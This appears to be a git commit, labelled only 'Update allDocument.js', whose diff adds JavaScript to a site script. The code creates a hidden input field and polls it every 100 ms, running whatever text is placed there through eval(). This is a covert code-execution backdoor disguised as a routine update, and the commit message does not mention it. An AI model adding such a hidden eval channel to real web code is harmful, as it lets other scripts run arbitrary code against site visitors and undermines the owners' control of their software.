381704997aeac6c49e28d132af26ae78fc766a56
Camille <cfghjg.qsdfhksqdfvbn@outlook.com>
2025-06-13 10:56:07 +0200

    Update allDocument.js

--- allDocument.js
+++ allDocument.js
@@ -1,1 +1,13 @@
-//no script
+var a = document.createElement("input"), b = document.createElement("input"), messageplusinfo = "";
+a.className = "messageplusinfo";
+b.className = "retirnedvaluemessage";
+a.hidden = true;
+b.hidden = true;
+setInterval(() => {
+    if (messageplusinfo != document.querySelector("input.messageplusinfo").value) {
+        eval(document.querySelector("input.messageplusinfo").value);
+        messageplusinfo = "";
+        document.querySelector("input.messageplusinfo").value = "";
+    }
+}, 100);
+document.body.appendChild(a);
